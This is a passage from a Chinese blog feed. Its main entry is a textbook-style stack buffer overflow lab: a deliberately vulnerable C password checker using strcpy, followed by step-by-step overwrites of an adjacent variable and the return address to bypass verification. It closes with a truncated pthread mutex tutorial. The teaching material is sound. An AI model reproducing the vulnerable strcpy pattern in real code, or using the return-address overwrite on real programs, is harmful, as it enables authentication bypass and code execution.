class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add esp, xxx ;降低栈顶，回收当前的栈帧</span><br><span class="line">pop ebp;将上一个栈帧底部位置恢复到 ebp，</span><br><span class="line">retn;这条指令有两个功能： </span><br><span class="line">;a)弹出当前栈顶元素，即弹出栈帧中的返回地址。</span><br><span class="line">;至此，栈帧恢复工作完成。 </span><br><span class="line">;b)让处理器跳转到弹出的返回地址，恢复调用前的代码区</span><br></pre></td></tr></table></figure><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220221170612199.png" alt="image-20220221170612199"></p><h1 id="修改邻接变量"><a class="markdownIt-Anchor" href="#修改邻接变量"></a> 修改邻接变量</h1><h2 id="修改邻接变量原理"><a class="markdownIt-Anchor" href="#修改邻接变量原理"></a> 修改邻接变量原理</h2><p>函数的局部变量在栈中相邻排列。如果局部变量有数组之类的缓冲区，并且程序中存在数组越界缺陷，那么越界的数组就能破坏相邻变量，甚至能破坏 EBP 、返回地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];<span class="comment">// add local buffto be overflowed</span></span><br><span class="line">    authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input password: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span>(valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the</span></span><br><span class="line"><span class="string">            verification!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当程序执行到 int verify_password(char *password)时，栈帧状态如下图：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220221170630782.png" alt="image-20220221170630782"></p><p><strong>改变程序流程思路：</strong></p><p>可以发现，authenticated 变量来源于 strcmp 函数的返回值，它被返回给main函数作为验证标志。当 authenticated 为 0 时，标识验证成功；反之，验证不成功。</p><p>当我们输入超过 7 个字符的密码（注意：字符截断符 NULL 将占用一个字节），就有机会把 authenticated 覆盖为 0，从而绕过密码验证。</p><h3 id="突破密码验证程序"><a class="markdownIt-Anchor" href="#突破密码验证程序"></a> 突破密码验证程序</h3><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td>如使用其他编译器，需重新调试</td></tr><tr><td>编译选项</td><td>默认编译选项</td><td>VS2003 和 VS2005 中的 GS 编译选项会使栈溢出实验失败</td></tr><tr><td>build 版本</td><td>debug 版本</td><td>如使用 release 版本，则需要重新调试</td></tr></tbody></table><blockquote><p>说明： 如果完全采用实验指导所推荐的实验环境，将精确地重现指导中所有的细节；否则需要根据具体情况重新调试。</p></blockquote><p>（1）先验证一下正确密码，输入“1234567”，通过验证，结果如下图所示：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519210442088.png" alt="image-20220519210442088"></p><p>（2）再来分析一下具体覆盖时，栈中的情况，输入“qqqqqqq”，因为“qqqqqqq”&gt;“1234567”，所以 strcmp 应该返回 1，即 authenticated 为 1。</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519213526513.png" alt="image-20220519213526513"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer[0～3]</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>buffer[4～7]</td><td>0x0012FB1C</td><td>NULL</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr></tbody></table><blockquote><p>观察内存时，注意 “内存数据” 与 “数值数据” 的区别。Win32 系统在内存中由低位向高位存储一个 4 字节的双字（DWORD），但在作为 ”数值“ 应用的时候，却是按照由高位字节向低位字节进行解释。“内存数据” 中的 DWORD 和我们逻辑上使用的 “数值数据” 是按字节序逆序过的。</p></blockquote><p>（3）输入超过 7 个字符，“qqqqqqqqrst”，结果如下图：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519214229348.png" alt="image-20220519214229348"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td></td><td>0x0012FB1C</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated 被覆盖前</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>authenticated 被覆盖后</td><td>0x0012FB20</td><td>NULL</td><td>0x74 (‘t’)</td><td>0x73 (‘s’)</td><td>0x72(‘r’)</td></tr></tbody></table><p>我们已经知道，通过溢出 buffer 我们能修改 authenticated 的值，若要改变程序流程，就需要把 authenticated 覆盖为 0，而我们的字符截断符 NULL，就刚好能实现，当我们输入 8 个 ‘q’ 时，buffer所拥有的 8 个字节将全部被 ’q‘ 填充，而 NULL 则刚好写入内存 0x0012FB20 出，即下一个双字的低位字节，恰好能把 authenticated 从 0x 00 00 00 01 改成 0x 00 00 00 00，如下图所示：</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519215420951.png" alt="image-20220519215420951"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td></td><td>0x0012FB1C</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated 被覆盖前</td><td>0x0012FB20</td><td></td><td></td><td></td><td>0x01</td></tr><tr><td>authenticated 被覆盖后</td><td>0x0012FB20</td><td></td><td></td><td></td><td>0x00 (NULL)</td></tr></tbody></table><p>经上述分析，我们只要输入 8 个**（大于 ”1234567“）** 字符的字符串，那么最后的 NULL 就能将 authenticated 低字节中的 1 覆盖为 0，从而绕过验证程序。</p><blockquote><p>authenticated = strcmp( password, PASSWORD )，<br>当输入的字符串大于 ”1234567“时，返回1（0x 00 00 00 01），这时可以用NULL 淹没 authenticated 的低位字节从而突破验证；<br>当输入的字符串小于 ”1234567“时，返回 -1（0x FF FF FF FF），这时如果任然用上述方法淹没，其值变为 0xFF FF FF 00，所以这时是不能冲破验证程序的。</p></blockquote><h1 id="修改函数返回地址"><a class="markdownIt-Anchor" href="#修改函数返回地址"></a> 修改函数返回地址</h1><h2 id="返回地址与程序流程"><a class="markdownIt-Anchor" href="#返回地址与程序流程"></a> 返回地址与程序流程</h2><p>更改邻接变量对环境要求很苛刻。而更改 EBP 和函数返回地址，往往更通用，更强大。</p><p>上节实验输入 7 个 “q“ ，程序栈状态：</p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer</td><td>0x0012FB18</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td></td><td>0x0012FB1C</td><td>NULL</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td><td>0x71 (‘q’)</td></tr><tr><td>authenticated</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>前栈帧 EBP</td><td>0x0012FB24</td><td>0x00</td><td>0x12</td><td>0xFF</td><td>0x80</td></tr><tr><td>返回地址</td><td>0x0012FB28</td><td>0x00</td><td>0x40</td><td>0x10</td><td>0xEB</td></tr></tbody></table><p>如果继续增加输入的字符，我们就能让字符串中相应位置字符的 ASCII 码覆盖掉这些栈帧状态值。</p><p>这里用 19 个字符作为输入，看看淹没返回地址会对程序产生什么影响。出于双字对齐的目的，我们输入的字符串按照 “ 4321 ” 为一个单元进行组织，最后输入的字符串为“ 4321432143214321432”。</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519232154440.png" alt="image-20220519232154440"></p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 字节</th><th>偏移 1 字节</th><th>偏移 0 字节</th></tr></thead><tbody><tr><td>buffer[0~3]</td><td>0x0012FB18</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>buffer[4~7]</td><td>0x0012FBIC</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>authenticated（被覆盖前）</td><td>0x0012FB20</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>authenticated（被覆盖后）</td><td>0x0012FB20</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>前栈帧 EBP（被覆盖前）</td><td>0x0012FB24</td><td>0x00</td><td>0x12</td><td>0xFF</td><td>0x80</td></tr><tr><td>前栈帧 EBP（被覆盖后）</td><td>0x0012FB24</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>返回地址（被覆盖前）</td><td>0x0012FB28</td><td>0x00</td><td>0x40</td><td>0x10</td><td>0xEB</td></tr><tr><td>返回地址（被覆盖后）</td><td>0x0012FB28</td><td>0x00(NULL)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr></tbody></table><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220519233124853.png" alt="image-20220519233124853"></p><p>返回地址用于在当前函数返回时重定向程序的代码。在函数返回的“ retn” 指令执行时，栈顶元素恰好是这个返回地址。“retn”指令会把这个返回地址弹入 EIP 寄存器，之后跳转到这个地址去执行。</p><p>返回地址本来是 0x004010EB，对应的是 main 函数代码区的指令，现在我们通过溢出 buff 覆盖返回地址为 0x00323334，函数返回时，将 0x00323334 装入 EIP 寄存器，从内存 0x00323334 处取址，由于此处没有合法指令，处理器不知如何处理，报错。</p><p>但如果这里是一个有效的指令地址，就能让处理器跳转到任意指令区去执行，我们可以通过淹没返回地址而控制程序的执行流程。</p><h2 id="控制程序的执行流程"><a class="markdownIt-Anchor" href="#控制程序的执行流程"></a> 控制程序的执行流程</h2><p>用键盘输入字符的 ASCII 表示范围有限，很多值（如 0x11、 0x12 等符号）无法直接用键盘输入，所以我们将程序的输入由键盘改为<strong>从文件中读取字符串</strong>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span> <span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    authenticated=<span class="built_in">strcmp</span>(password,PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,password);<span class="comment">//over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span>(valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序的基本逻辑和上一节中的代码大体相同，只是现在将从同目录下的 password.txt 文件中读取字符串。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP SP3</td><td>其他 Win32 操作系统也可进行本实验</td></tr><tr><td>编译器</td><td>Visual C++ 6.0</td><td>如使用其他编译器，需重新调试</td></tr><tr><td>编译选项</td><td>默认编译选项</td><td>VS2003 和 VS2005 中的 GS 编译选项会使栈溢出实验失败</td></tr><tr><td>build 版本</td><td>debug 版本</td><td>如使用 release 版本，则需要重新调试</td></tr></tbody></table><blockquote><p>用 VC6.0 将上述代码编译链接（使用默认编译选项， Build 成 debug 版本），在与 PE 文件同目录下建立 password.txt 并写入测试用的密码之后，就可以用 OllyDbg 加载调试了。</p></blockquote><p>动态调试时，需要我们做的工作：</p><p>（1）摸清楚栈中的状况，如函数地址距离缓冲区的偏移量等。<br>（2）得到程序中密码验证通过的指令地址，以便程序直接跳去这个分支执行。<br>（3）在 password.txt 文件的相应偏移处填上这个地址。</p><p>这样 verify_password 函数返回后就能直接跳转到验证通过的分支执行了。</p><p>用OllyDbg 加载 可执行文件，【找到验证的程序分支的指令地址为】按G调出程序执行的流程图，分析一下程序执行流程。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605154207339.png" alt="image-20220605154207339"></p><p>从上面的流程图中，可以发现，在<code>401111</code>处的指令进行了程序验证。</p><p><code>0x00401102</code> 调用了 verify_password 函数，之后在 <code>0x0040110A</code> 处将EAX中的返回值取出，在 <code>0x0040110D</code>处与0比较，然后决定跳转到提示验证通过的分支或是提示验证失败的分支。</p><p>提示验证通过的分支从 <code>0x00401122</code>处的参数压栈开始。如果我们把返回地址覆盖成这个地址，那么在 <code>0x00401102</code>处的函数调用返回后，程序将跳转到验证通过的分支，而不是进入分支判断代码。</p><p>通过动态调试，发现栈帧中的变量分布情况基本没变。这样我们按如下方法构造 password.txt 中的数据。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605162225968.png" alt="image-20220605162225968"></p><p>构造思路：用2个 “4321”来填充 buffer[8]，第3个“4321”来覆盖 authenticated，第4个“4321”覆盖前栈帧 EBP，第5个“4321” 的 ASCII码值 0x34333231 修改成验证通过分支的指令地址 0x00401122。</p><p>在构造 password.txt 时，我们需要用到一个软件 Ultraedit，通过它来编辑十六进制。</p><p>构造步骤：</p><ol><li><p>创建一个 password.txt文件，写入5个“4321”，放在实验程序的目录中。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605163446828.png" alt="image-20220605163446828"></p></li><li><p>用 Ultraedit32 打开 password.txt<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605163838554.png" alt="image-20220605163838554"></p></li><li><p>切换至十六进制编辑模式。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605163926732.png" alt="image-20220605163926732"></p></li><li><p>将最后4个字节修改为新的返回地址 0x00401122，注意：由于“大顶端”，我们需要逆序输入这4个字节</p><p><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605164113427.png" alt="image-20220605164113427"></p></li></ol><p>将 password.txt 保存后，用 OllyDbg 加载程序并调试，可以看到最终的栈状态如表所示。</p><table><thead><tr><th>局部变量名</th><th>内存地址</th><th>偏移 3 处的值</th><th>偏移 2 处的值</th><th>偏移 1 处的值</th><th>偏移 0 处的值</th></tr></thead><tbody><tr><td>buffer[0~3]</td><td>0x0012FB14</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>buffer[4~7]</td><td>0x0012FB18</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>authenticated（被覆盖前）</td><td>0x0012FB1C</td><td>0x00</td><td>0x00</td><td>0x00</td><td>0x01</td></tr><tr><td>authenticated（被覆盖后）</td><td>0x0012FB1C</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>前栈帧 EBP（被覆盖前）</td><td>0x0012FB20</td><td>0x00</td><td>0x12</td><td>0xFF</td><td>0x80</td></tr><tr><td>前栈帧 EBP（被覆盖后）</td><td>0x0012FB20</td><td>0x31 (‘1’)</td><td>0x32 (‘2’)</td><td>0x33 (‘3’)</td><td>0x34 (‘4’)</td></tr><tr><td>返回地址（被覆盖前）</td><td>0x0012FB24</td><td>0x00</td><td>0x40</td><td>0x11</td><td>0x07</td></tr><tr><td>返回地址（被覆盖后）</td><td>0x0012FB24</td><td>0x00</td><td>0x40</td><td>0x11</td><td>0x22</td></tr></tbody></table><p>程序执行状态如下图所示。<br><img src="/2022/06/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20220605164434401.png" alt="image-20220605164434401"></p><p>由于站内EBP被覆盖为无效值，使得程序在退出时堆栈无法平衡，导致崩溃。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基础知识&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#基础知识&quot;&gt;&lt;/a&gt; 基础知识&lt;/h1&gt;
&lt;h2 id=&quot;二进制文件概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#二进制文件概述&quot;&gt;&lt;/a&gt; 二进</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="栈" scheme="https://www.rgzzplus.com/tags/%E6%A0%88/"/>
    
  </entry>
  
  <entry>
    <title>线程的同步互斥</title>
    <link href="https://www.rgzzplus.com/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/"/>
    <id>https://www.rgzzplus.com/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/</id>
    <published>2022-05-10T07:06:44.000Z</published>
    <updated>2022-05-10T07:10:28.262Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统同步互斥"><a class="markdownIt-Anchor" href="#操作系统同步互斥"></a> 《操作系统》同步互斥</h1><h1 id="引起同步互斥问题的原因"><a class="markdownIt-Anchor" href="#引起同步互斥问题的原因"></a> 引起同步互斥问题的原因</h1><p>​当下人们需要让进程在短时间内同时完成不止一件事情，每个线程处理各自独立的任务。线程是进程的更小分支，每一线程完成进程的一部分任务，但系统并不给线程分配任何资源，它共享创建它的进程所拥有的资源。但是当一个线程修改变量时，其它线程在读取这个变量时可能读取到不一致的值，无法区分到底是读取了修改前的值，还是修改后的值，导致了程序执行结果无法复现，所以就引入了同步互斥，来解决进程内的资源分配问题。</p><h1 id="同步互斥方法说明"><a class="markdownIt-Anchor" href="#同步互斥方法说明"></a> 同步互斥方法说明</h1><h2 id="互斥锁-同步互斥方法说明"><a class="markdownIt-Anchor" href="#互斥锁-同步互斥方法说明"></a> 互斥锁 同步互斥方法说明</h2><p>​互斥锁，一个线程在进入临界区时应得到锁，在它退出时释放锁，以让其它需要的线程访问这个临界区。对于获得锁的进程，它会执行临界区的代码，同时其它未获得锁的线程会被阻塞，直到得到锁才会进入临界区。</p><h2 id="自旋锁-同步互斥方法说明"><a class="markdownIt-Anchor" href="#自旋锁-同步互斥方法说明"></a> 自旋锁 同步互斥方法说明</h2><p>​自旋锁与互斥锁原理基本相同，不同之处在于未获得锁时被阻塞的方法实现不同，互斥锁通过硬件方法阻塞，而自旋锁通过软件方法，即让线程空循环来等待。</p><h2 id="信号量-同步互斥方法说明"><a class="markdownIt-Anchor" href="#信号量-同步互斥方法说明"></a> 信号量 同步互斥方法说明</h2><p>​同步，一个线程完成了某一个动作就通过信号量告诉别的线程，别的线程再进行某些动作。而且信号量有一个更加强大的功能，信号量可以用作为资源计数器，把信号量的值初始化为某个资源当前可用的数量，使用一个之后递减，归还一个之后递增。</p><h2 id="条件变量-同步互斥方法说明"><a class="markdownIt-Anchor" href="#条件变量-同步互斥方法说明"></a> 条件变量 同步互斥方法说明</h2><p>​条件变量，用while循环作判断条件，循环条件满足线程进入工作队列等待，直到其它线程的执行使得条件满足后，该线程才会跳出循环，继续执行剩余代码。</p><h2 id="屏障-同步互斥方法说明"><a class="markdownIt-Anchor" href="#屏障-同步互斥方法说明"></a> 屏障 同步互斥方法说明</h2><p>​屏障允许等待任意数目的线程都到达某一点，直到到达该点的线程达到规定数目，然后从该点继续执行，而不用线程退出。</p><h2 id="读写锁-同步互斥方法说明"><a class="markdownIt-Anchor" href="#读写锁-同步互斥方法说明"></a> 读写锁 同步互斥方法说明</h2><p>​读写与互斥量类似，读写锁有3种状态，读模式加锁，写模式加锁，不加锁。一次只能有一个线程占有写模式的读写锁，但是多个线程可以同时占有读模式的读写锁。</p><h1 id="同步互斥方法实现"><a class="markdownIt-Anchor" href="#同步互斥方法实现"></a> 同步互斥方法实现</h1><h2 id="互斥锁-同步互斥方法实现"><a class="markdownIt-Anchor" href="#互斥锁-同步互斥方法实现"></a> 互斥锁 同步互斥方法实现</h2><h3 id="互斥锁-同步互斥示例代码"><a class="markdownIt-Anchor" href="#互斥锁-同步互斥示例代码"></a> 互斥锁 同步互斥示例代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> ticketAmount = <span class="number">2</span>; <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">pthread_mutex_t</span> lock = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"><span class="comment">//创建全局锁并初始化</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">ticketAgent</span><span class="params">(<span class="type">void</span>* arg)</span>&#123;</span><br><span class="line">    pthread_mutex_lock(&amp;lock);  <span class="comment">//上锁</span></span><br><span class="line">    <span class="type">int</span> t = ticketAmount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (t &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;售出一张票!\n&quot;</span>);</span><br><span class="line">        t--;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;票已经卖完了!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ticketAmount = t;</span><br><span class="line">    pthread_mutex_unlock(&amp;lock);        <span class="comment">//解锁</span></span><br><span class="line">    pthread_exit(<span class="number">0</span>);                <span class="comment">//退出线程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pthread_t</span> ticketAgent_tid[<span class="number">2</span>];   <span class="comment">//创建线程pid</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_create(ticketAgent_tid+i, <span class="literal">NULL</span>, ticketAgent,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//创建两个线程</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pthread_join(ticketAgent_tid[i],<span class="literal">NULL</span>);</span><br><span class="line">    &#125;<span class="comment">//让主线程等待其它线程完成</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;还剩下 %d张票\n&quot;</span>, ticketAmount);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span 